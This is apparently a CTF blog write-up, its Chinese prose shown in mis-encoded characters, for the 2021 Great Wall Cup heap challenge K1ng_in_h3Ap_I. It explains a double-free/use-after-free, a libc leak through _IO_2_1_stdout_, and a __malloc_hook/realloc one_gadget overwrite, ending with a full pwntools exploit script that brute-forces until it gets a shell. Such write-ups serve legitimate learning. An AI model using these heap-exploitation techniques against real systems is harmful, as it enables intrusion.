---
title: é•¿åŸæ¯2021
date: 2021-09-20 16:26:46
tags: ['ä¿¡æ¯å®‰å…¨','ctf']
categories: ['ctf']
---

# å‰è¨€

  ç¾å¥½çš„ä¸€ä¸ªä¸­ç§‹å‡æœŸï¼Œç„¶è€ŒåŸºå‹ä»¬éƒ½å»è§å¥³æœ‹å‹äº†ã€‚ã€‚ã€‚åªæœ‰è‡ªå·±åœ¨æ‰“æ¯”èµ›ï¼Œå¤ªæƒ¨äº†ï¼ï¼ï¼
  è™½ç„¶å¦‚æ­¤ï¼Œ**å¥³ç”Ÿåªä¼šå½±å“æˆ‘æ‹”å‰‘çš„é€Ÿåº¦**ã€‚è¿˜æ˜¯æ¥æ€»ç»“ä¸€ä¸‹è¿™åœºæ¯”èµ›çš„éªšæ€è·¯æ›´ç°å®ä¸€äº›ğŸ˜¶

# K1ng_in_h3Ap_I

  [ç‚¹å‡»ä¸‹è½½é¢˜ç›®é™„ä»¶](K1ng_in_h3Ap.tar.gz)
  
## é¢˜ç›®ä¿æŠ¤

  å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒåŸºæœ¬ä¿æŠ¤å…¨å¼€
  ![K1ng_in_h3Apä¿æŠ¤æœºåˆ¶](K1ng_in_h3Apä¿æŠ¤æœºåˆ¶.PNG)

## é¢˜ç›®é€»è¾‘

  å…¶å°±æ˜¯ä¸€ä¸ªæ ‡å‡†çš„èœå•å †ï¼Œæ¡†æ¶å¦‚ä¸‹æ‰€ç¤º
  ```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // eax

  nothing();
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      v3 = read_int();
      if ( v3 != 2 )
        break;
      delete();
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        edit();
      }
      else if ( v3 == 666 )
      {
        show();
      }
    }
    else if ( v3 == 1 )
    {
      add();
    }
  }
}
```

  å¯¹äº`add`åŠŸèƒ½ï¼Œå°±æ˜¯æ·»åŠ ä¸€ä¸ªç»™å®šè¾“å…¥å¤§å°çš„å†…å­˜å—ï¼Œé€»è¾‘å¦‚ä¸‹æ‰€ç¤º
  ```c
_DWORD *add()
{
  _DWORD *result; // rax
  int v1; // [rsp+8h] [rbp-8h]
  int v2; // [rsp+Ch] [rbp-4h]

  puts("input index:");
  v1 = read_int();
  if ( v1 < 0 || v1 > 10 )
    exit(0);
  puts("input size:");
  v2 = read_int();
  if ( v2 < 0 || v2 > 240 )
    exit(0);
  chunks[v1] = malloc(v2);
  result = size;
  size[v1] = v2;
  return result;
}
```

  å¯¹äº`delete`åŠŸèƒ½ï¼Œå…¶å°±æ˜¯`free`æ‰ç”³è¯·çš„å†…å­˜ã€‚ä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰ç½®0ï¼Œä»è€Œå¯¼è‡´å­˜åœ¨`double free`é—®é¢˜ã€‚å…¶é€»è¾‘å¦‚ä¸‹æ‰€ç¤º
  ```c
void delete()
{
  int v0; // [rsp+Ch] [rbp-4h]

  puts("input index:");
  v0 = read_int();
  if ( v0 < 0 || v0 > 10 || !chunks[v0] || !size[v0] )
    exit(0);
  free((void *)chunks[v0]);
}
```

  å¦å¤–ï¼Œåˆ™æ˜¯`edit`åŠŸèƒ½ï¼Œå°±æ˜¯æ ¹æ®`add`æ—¶çš„æ•°æ®ï¼Œé‡æ–°å‘å†…å­˜ä¸­å†™å…¥æ•°æ®ã€‚ç”±äºå‰é¢`delete`å¤„çš„æ¼æ´ï¼Œåˆ™è¿™é‡Œå­˜åœ¨ä¸¥é‡çš„`UAF`ã€‚å…¶é€»è¾‘å¦‚ä¸‹æ‰€ç¤º
  ```c
unsigned __int64 edit()
{
  int v1; // [rsp+Ch] [rbp-4h]

  puts("input index:");
  v1 = read_int();
  if ( v1 < 0 || v1 > 15 || !chunks[v1] )
    exit(0);
  puts("input context:");
  return read_input(chunks[v1], size[v1]);
}
```

  æœ€åï¼Œåˆ™æ˜¯å”¯ä¸€çš„ä¸€ä¸ªå—é™è¾“å‡ºï¼Œå…¶é€»è¾‘å¦‚ä¸‹æ‰€ç¤º
  ```c
int show()
{
  return printf("%p\n", (const void *)((unsigned __int64)&printf & 0xFFFFFF));
}
```


## è§£é¢˜æ€è·¯

  glibcä¸‹çš„é¢˜ç›®åŸºæœ¬éƒ½æ˜¯æ¨¡æ¿é¢˜â€”â€”å¦‚æœå¼€å¯äº†PIEå’Œåœ°å€éšæœºåŒ–ï¼Œåˆ™å°±æ˜¯æ³„éœ²glibcåŸºå€ï¼Œç„¶åè°ƒç”¨ç›¸å…³ç³»ç»Ÿè°ƒç”¨å³å¯

  è¿™é‡Œæ˜æ˜¾æ²¡æœ‰å¯ä»¥æ§åˆ¶çš„è¾“å‡ºå‡½æ•°ã€‚ä½†æ˜¯ä¸€èˆ¬çš„è¾“å‡ºå‡½æ•°ä¼šè¾“å‡º**_IO_2_1_stdout_->_IO_write_base**åœ°å€å¤„**_IO_2_1_stdout_->_IO_write_ptr - _IO_2_1_stdout_->_IO_write_base**å¤§å°çš„å­—èŠ‚ã€‚åˆ™é€šç”¨çš„å¥—è·¯å°±æ˜¯æ”¹å°**_IO_2_1_stdout_->_IO_write_base**çš„å€¼ï¼Œä»è€Œè®©è¾“å‡ºå‡½æ•°å¤šè¾“å‡ºä¸€äº›å†…å®¹ï¼Œè€Œè¿™é‡Œé¢å¾€å¾€å°±ä¼šåŒ…å«æœ‰glibcç›¸å…³çš„æ•°æ®

  ç”±äºæœ‰äº†åŸºå€ï¼Œåˆ™é€šè¿‡`UAF`ï¼Œæˆ‘ä»¬å¯ä»¥å‘`__free_hook`æˆ–`__malloc_hook`ä¸­å†™å…¥**one_gadget**ï¼Œä»è€Œæœ€ç»ˆè·å–shell


## å¥—è·¯å§¿åŠ¿

### _IO_2_1_stdoutæ³„éœ²glibcåŸºå€

  ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæŒ‡å‘**_IO_2_1_stdout**ç»“æ„ä½“é™„è¿‘çš„å†…å­˜å—ï¼Œä»è€Œå†™å…¥è¦†ç›–çš„æ•°æ®
  ç”±äº**_IO_2_1_stdout**ç»“æ„ä½“é™„è¿‘(_IO_2_1_stdout - 0x40 + 5 - 8)æ°å¥½æœ‰ä¸€ä¸ªå¯ä»¥ä¼ªé€ æˆ**0x71**çš„fast bin(fast binçš„SIZEå­—æ®µ0x7fç­‰æ•ˆäº0x71)ï¼Œå¦‚ä¸‹æ‰€ç¤º
  ![_IO_2_1_stdoutä¼ªé€ chunk](IO_2_1_stdoutä¼ªé€ chunk.PNG)


  åˆ™æˆ‘ä»¬åªéœ€è¦åœ¨å°†è¯¥ä¼ªé€ chunkæ’å…¥ç›¸å…³çš„fast biné“¾ä¸­ã€‚åˆ™ç”³è¯·å†…å­˜æ—¶ï¼Œè¯¥ä¼ªé€ chunkå¯ä»¥å½“åšæ­£å¸¸çš„å†…å­˜è¢«è¿”å›ï¼Œåˆ™ç›´æ¥æˆ‘ä»¬åªéœ€è¦è¾“å…¥å¦‚ä¸‹æ•°æ®ï¼Œå³å¯å°†**_IO_2_1_stdout->_IO_write_base**çš„ä½ä½è¦†ç›–ä¸º**\x00**ï¼Œä»è€Œè¾“å‡ºå‡½æ•°ä¼šè¾“å‡ºæ›´å¤šå†…å®¹
  ```python
padding * 51 + p64(0xfbad1800) + p64(0) * 3 + '\x00'
```

### è¦†ç›–é“¾è¡¨æŒ‡å‘

  å¦‚æœæ²¡æœ‰å¯æ§çš„è¾“å‡ºå‡½æ•°ï¼Œåˆ™æˆ‘ä»¬å¾ˆéš¾è·å–å †åœ°å€ï¼Œè¿™å¯¹äºä¿®æ”¹ç©ºé—²é“¾è¡¨çš„æŒ‡å‘é˜»ç¢å¾ˆå¤§(å› ä¸ºæˆ‘ä»¬æ²¡æ³•å°†é“¾è¡¨çš„æŒ‡å‘ä¿®æ”¹åˆ°å·²æœ‰çš„åˆæ³•å †ç©ºé—´)ä¸­ï¼Œä½†æ˜¯å¹¶éå®Œå…¨æ²¡æœ‰åŠæ³•ã€‚

  å¦‚æœæˆ‘ä»¬çš„è¦æ±‚ä»…ä»…æ˜¯å°†é“¾è¡¨æŒ‡å‘ä¿®æ”¹åˆ°ç›¸è¿‘çš„å †åœ°å€ä¸­ï¼Œåˆ™å¯ä»¥é€šè¿‡è¦†ç›–é“¾è¡¨æŒ‡å‘çš„åå‡ ä½ï¼Œä»è€Œæ›´æ”¹é“¾è¡¨çš„æŒ‡å‘ã€‚

  ä¸€èˆ¬è¿™ä¸ªç”¨æ¥å’Œå‰é¢**_IO_2_1_stdout_**é…åˆä½¿ç”¨çš„ã€‚
  å¦‚æœä¸€ä¸ªfast binä¸Šä¿ç•™æœ‰**unsorted bin**ç­‰çš„fdä¿¡æ¯ï¼Œåˆ™è¯¥å€¼å’Œ**_IO_2_1_stdout_**ä¸€èˆ¬ä»…ä»…ä½16ä½ä¸åŒï¼Œè€Œç”±äºä½12ä½æ˜¯å›ºå®šçš„ï¼Œå› æ­¤è¦†ç›–æ‰è¯¥fast binçš„å16ä½ï¼Œæœ‰$$\frac{1}{16}$$çš„å¯èƒ½æ€§ï¼Œå…¶æŒ‡å‘**_IO_2_1_stdout_**å¤„ä¼ªé€ çš„chunkã€‚å› æ­¤åªéœ€è¦ç¨åŠ çˆ†ç ´ï¼Œå³å¯æˆåŠŸåˆ©ç”¨


### one_gadgetå’ŒæŠ¬é«˜ç›¸å¯¹æ ˆåŸºå€çš„å®é™…åœ°å€

  åœ¨glibcä¸­ï¼Œæˆ‘ä»¬ä¼šè¿›è¡Œä½¿ç”¨**one_gadget**â€”â€”å°†å…¶å†™å…¥gotè¡¨ä¸­æˆ–è¿”å›åœ°å€ä¸­ï¼Œç„¶åé€šè¿‡æ‰§è¡Œè¯¥åœ°å€å¤„çš„ä»£ç ï¼Œä»è€Œä¸€æ­¥è·å–shellã€‚å½“ç„¶ï¼Œå¥½ä¸œè¥¿éƒ½æ˜¯æœ‰ä»£ä»·çš„ï¼Œå…¶æ‰§è¡Œéœ€è¦æœ‰è¯¸å¤šçš„é™åˆ¶ï¼Œå¦‚æ ˆä¸­æ•°æ®æˆ–å¯„å­˜å™¨çš„è¦æ±‚ï¼Œå¦‚ä¸‹æ‰€ç¤º
  ![one_gadgetçº¦æŸ](one_gadgetçº¦æŸ.PNG)

  è€Œæœ‰æ—¶ï¼Œæ ˆä¸Šæ•°æ®æˆ–å¯„å­˜å™¨ç¡®å®æ— æ³•æ»¡è¶³è¿™äº›è¦æ±‚ï¼Œåˆ™æˆ‘ä»¬å°±å¾ˆéš¾ä½¿ç”¨è¯¥æ¡ä»¶ã€‚
  ä½†å¦‚æœæ·»åŠ ä¸€ä¸ªæ¡ä»¶ï¼Œæˆ‘ä»¬æœ‰æŒ‡å‘`__malloc_hook`çš„æŒ‡é’ˆï¼Œåˆ™é—®é¢˜å°±å¥½åŠå¤šäº†â€”â€”å› ä¸º`__realloc_hook`å°±åœ¨`__malloc_hook`æ—è¾¹

  ä¸€èˆ¬ï¼Œå¦‚æœæœ‰æŒ‡å‘`__malloc_hook`çš„æŒ‡é’ˆï¼Œéƒ½æ˜¯æŒ‡å‘`__malloc_hook`å‘¨è¾¹ä¼ªé€ çš„fast binï¼Œå¦‚ä¸‹æ‰€ç¤º
  ![__malloc_hookä¼ªé€ chunk](malloc_hookä¼ªé€ chunk.PNG)

  å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬å°†`__malloc_hook`è®¾ç½®ä¸º`realloc`çš„åœ°å€ï¼ŒåŒæ—¶å°†`__realloc_hook`çš„åœ°å€è®¾ç½®ä¸º**one_gadget**ï¼Œåˆ™å®é™…ä¸Šä»ç„¶ç›¸å½“äºæ‰§è¡Œäº†**one_gadget**ã€‚ä½†æ˜¯ä¸€èˆ¬å‡½æ•°å¼€å§‹éƒ¨åˆ†éƒ½æ˜¯**push**æŒ‡ä»¤ï¼Œå…¶ä¼šé™ä½æ ˆåœ°å€ï¼Œåˆ™æˆ‘ä»¬è·³è¿‡å‡ ä¸ª`realloc`çš„**push**æŒ‡ä»¤çš„è¯ï¼Œä»ç„¶ä¼šæ‰§è¡Œ**one_gadget**ï¼Œä½†æ˜¯ç›¸å¯¹æ ˆåŸºå€ä½ç§»å¤„çš„å®é™…åœ°å€å˜å¤§äº†ï¼Œç›¸å½“äºæŠ¬é«˜æ ˆå¸§ï¼Œåˆ™å¾ˆå®¹æ˜“æ»¡è¶³**one_gadget**çš„çº¦æŸã€‚
  è¿™é‡Œé¦–å…ˆç»™å‡º`realloc`éƒ¨åˆ†æ±‡ç¼–ä»£ç åŠå…¶åç§»ï¼Œå¦‚ä¸‹æ‰€ç¤º
  ```x86asm
   84710:	41 57                	push   %r15
   84712:	41 56                	push   %r14
   84714:	41 55                	push   %r13
   84716:	41 54                	push   %r12
   84718:	49 89 f4             	mov    %rsi,%r12
   8471b:	55                   	push   %rbp
   8471c:	53                   	push   %rbx
   8471d:	48 89 fb             	mov    %rdi,%rbx
   84720:	48 83 ec 38          	sub    $0x38,%rsp
   84724:	48 8b 05 a5 f8 33 00 	mov    0x33f8a5(%rip),%rax        # 3c3fd0 <_IO_file_jumps@@GLIBC_2.2.5+0x8f0>
   8472b:	48 8b 00             	mov    (%rax),%rax
   8472e:	48 85 c0             	test   %rax,%rax
   84731:	0f 85 21 02 00 00    	jne    84958 <__libc_realloc@@GLIBC_2.2.5+0x248>
```


  åˆ™æˆ‘ä»¬åªéœ€è¦åœ¨`__malloc_hook`é™„è¿‘è¾“å…¥å¦‚ä¸‹æŒ‡ä»¤ï¼Œå³å¯å®Œæˆ**one_gadget**çš„åˆ©ç”¨
  ```python
padding * 0xb + p64(lib_base + one_gadget) + p64(lib_base + lib.sym['realloc'] + offset)
```

## é¢˜è§£å’Œå…³é”®è¯´æ˜

  é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæŒ‡å‘**_IO_2_1_stdout_**é™„è¿‘çš„å†…å­˜å—ï¼Œä¸€èˆ¬é€šè¿‡é‡Šæ”¾è¶…è¿‡**fast bin**å¤§å°çš„å†…å­˜æ¥è·å–ï¼Œç„¶ååœ¨é€šè¿‡è¦†ç›–å·²æœ‰çš„fast biné“¾æŒ‡é’ˆï¼Œå°†è¯¥fake chunkæ’å…¥é“¾ä¸Šï¼Œç›¸å…³ä»£ç å¦‚ä¸‹æ‰€ç¤º
  ```python
	wp_add(r, 0, 0xd0)		#base
	wp_add(r, 2, 0x10)		#base
	wp_delete(r, 0)

	wp_add(r, 1, 0x60)		#base
	wp_add(r, 2, 0x60)		#base + 0x70
	wp_add(r, 3, 0x60)		#base + 0x70 * 2

	wp_delete(r, 2)
	wp_delete(r, 3)
	wp_edit(r, 3, '\x00')
	wp_edit(r, 1, '\xdd\x25')
	wp_add(r, 4, 0x60)
	wp_add(r, 3, 0x60)
	wp_add(r, 2, 0x60)
```

  ç»è¿‡è¿™äº›æ­¥éª¤ï¼Œæ­¤æ—¶å†…å­˜å¸ƒå±€å¦‚ä¸‹æ‰€ç¤º
  ![K1ng_in_h3Ap_Iå†…å­˜å¸ƒå±€1](K1ng_in_h3Ap_Iå†…å­˜å¸ƒå±€1.PNG)

  æ­¤æ—¶ï¼Œåœ¨0x70å¤§å°çš„fast biné“¾ä¸Šï¼Œå·²ç»å½¢æˆäº†**chunk_baes + 0x100**->**chunk_baes**->**_IO_2_1_stdout_ - 0x43**çš„é“¾ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥è¦†ç›–**_IO_2_1_stdout_**çš„å€¼ï¼Œä»è€Œæ³„éœ²glibcåŸºå€


  æœ€åï¼Œåˆ™æ˜¯æ™®é€šçš„ä¼ªé€ chunkï¼Œä»è€Œä¿®æ”¹**__malloc_hook**ä¸º**one_gadget**ï¼Œè¿™é‡Œå±•ç¤ºä¸€ä¸‹æŠ¬æ ˆå§¿åŠ¿ï¼Œæˆ‘ä»¬å°±ä»¥`[rsp + 0x30] = 0`çº¦æŸä¸ºä¾‹ï¼Œå…¶ä½™æ˜¯ç±»ä¼¼çš„ã€‚
  å¦‚æœæˆ‘ä»¬ç®€å•çš„ç›´æ¥ä¿®æ”¹**__malloc_hook**ä¸º**realloc@@GLIBC_2.2.5**ï¼Œå†å°†**__realloc_hook**æ›´æ”¹ä¸º**one_gadget**ï¼Œåˆ™å…¶æœ€åé¢ä¸´å¦‚ä¸‹æƒ…å†µ
  ![rsp+0x30çº¦æŸä¸‹one_gadgetæ ˆä¸Šæ•°æ®1](rsp+0x30çº¦æŸä¸‹one_gadgetæ ˆä¸Šæ•°æ®1.PNG)


  æ ¹æ®å‰é¢**realloc@GLIBC_2.2.5**æ±‡ç¼–ä»£ç å¯ä»¥çœ‹åˆ°ï¼Œä»**realloc**åˆ°**one_gadget**ï¼Œå…¶å°†æ ˆåœ°å€ä¸‹è°ƒäº†**0x70**ï¼Œè€Œ`[rsp + 0x30 - 0x70] != 0`ï¼Œå³ä¸æ»¡è¶³**one_gadget**çº¦æŸã€‚ä½†æ˜¯æˆ‘ä»¬å‘ç°`[rsp + 0x30 - 0x70 + 0x8 * 4]`å¤„å­˜åœ¨æ»¡è¶³çº¦æŸçš„æ•°æ®â€”â€”åˆ™æˆ‘ä»¬åªéœ€è¦æŠ¬é«˜æ ˆåŸºå€0x20ï¼Œå³å‡å°‘å››æ¬¡`push`æŒ‡ä»¤ï¼Œå³å¯æ»¡è¶³**one_gadget**çº¦æŸã€‚
  å› æ­¤ï¼Œæ ¹æ®å‰é¢ç»™å‡ºçš„`realloc`æ±‡ç¼–ä»£ç ï¼Œæˆ‘ä»¬å°†**__malloc_hook**è®¾ç½®ä¸º**realloc@@GLIBC_2.2.5 + 8**ï¼Œä»ç„¶å°†**__realloc_hook**æ›´æ”¹ä¸º**one_gadget**å³å¯ï¼Œæ­¤æ—¶æƒ…å†µå¦‚ä¸‹æ‰€ç¤º
  ![rsp+0x30çº¦æŸä¸‹one_gadgetæ ˆä¸Šæ•°æ®2](rsp+0x30çº¦æŸä¸‹one_gadgetæ ˆä¸Šæ•°æ®2.PNG)

  æœ€åï¼Œå®Œæ•´çš„wpå¦‚ä¸‹æ‰€ç¤º
  ```python
#!/usr/bin/python2
# -*- coding:utf-8 -*-
from pwn import *
import sys
import platform

'''
	å¾…ä¿®æ”¹æ•°æ®
'''
context.log_level = 'debug'
context.arch = 'amd64'				# 32ä½ä½¿ç”¨i386
context.os = 'linux'

execve_file = './pwn'
lib_file = './libc.so.6'
argv = []




'''
	elf.plt[`symbol`] è·å–elfæ–‡ä»¶ä¸­å¯¼å…¥ç¬¦å·çš„pltåœ°å€
	elf.got[`symbol`] è·å–elfæ–‡ä»¶ä¸­å¯¼å…¥ç¬¦å·çš„gotåœ°å€
	elf.sym['symbol'] è·å–elfæ–‡ä»¶ä¸­æœ¬åœ°ç¬¦å·çš„å‡½æ•°å®é™…åœ°å€
'''
if execve_file != None:
	elf = ELF(execve_file)

'''
	lib.sym[`symbol`] è·å–libä¸­ç¬¦å·åœ°å€
	lib.search['string'].next() è·å–libä¸­å­—ç¬¦ä¸²åœ°å€
'''
if lib_file != None:
	lib = ELF(lib_file)

log.info('-----------------------------------------------------------')


'''
	æ‰§è¡Œçˆ†ç ´æ”»å‡»
	åªæœ‰å½“æˆåŠŸè·å–shellæˆ–è€…é”®ç›˜Ctrl+Cé€€å‡ºæ—¶ï¼Œç¨‹åºä¸­æ­¢å¾ªç¯
	å¦åˆ™ç¨‹åºä¸€ç›´è¿›è¡Œå¾ªç¯
'''


def wp_add(r, idx, size):
	r.sendlineafter('>>', '1')
	r.sendlineafter('input index:', str(idx))
	r.sendlineafter('input size:', str(size))

def wp_delete(r, idx):
	r.sendlineafter('>>', '2')
	r.sendlineafter('input index:', str(idx))


def wp_edit(r, idx, context):
	r.sendlineafter('>>', '3')
	r.sendlineafter('input index:', str(idx))
	r.sendlineafter('input context:', context)

def wp_show(r):
	r.sendlineafter('>>', '666')

def exp():
	if 'd' in sys.argv:
		#r = gdb.debug([execve_file] + argv)	# é¦–å…ˆåŠ è½½å½“å‰ç›®å½•ä¸‹çš„åŠ¨æ€åº“æ–‡ä»¶
		r = process([execve_file] + argv)	# é¦–å…ˆåŠ è½½å½“å‰ç›®å½•ä¸‹çš„åŠ¨æ€åº“æ–‡ä»¶
	else:
		r = remote(sys.argv[1], sys.argv[2])

	wp_add(r, 0, 0xd0)		#base
	wp_add(r, 2, 0x10)		#base
	wp_delete(r, 0)

	wp_add(r, 1, 0x60)		#base
	wp_add(r, 2, 0x60)		#base + 0x70
	wp_add(r, 3, 0x60)		#base + 0x70 * 2

	wp_delete(r, 2)
	wp_delete(r, 3)
	wp_edit(r, 3, '\x00')
	wp_edit(r, 1, '\xdd\x25')
	wp_add(r, 4, 0x60)
	wp_add(r, 3, 0x60)
	wp_add(r, 2, 0x60)

	wp_edit(r, 2, '\x00' * 51 + p64(0xfbad1800) + p64(0) * 3 + '\x88')
	lib_base = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00')) + 0x7ffff7a0d000 - 0x7ffff7dd18e0
	log.info('lib_base => %#x'%(lib_base))


	wp_delete(r, 3)
	wp_edit(r, 3, p64(lib_base + lib.sym['__malloc_hook'] - 0x23))

	wp_add(r, 3, 0x60)
	wp_add(r, 3, 0x60)

	wp_edit(r, 3, '\x00' * 0xb + p64(lib_base + 0x4527a) + p64(lib_base + lib.sym['realloc'] + 8))
	wp_add(r, 3, 0x60)
	r.interactive()

while True:
	try:
		exp()
		break
	except KeyboardInterrupt:
		break
	except:
		continue

	
log.info('-----------------------------------------------------------')
```

# ~~K1ng_in_h3Ap_II~~


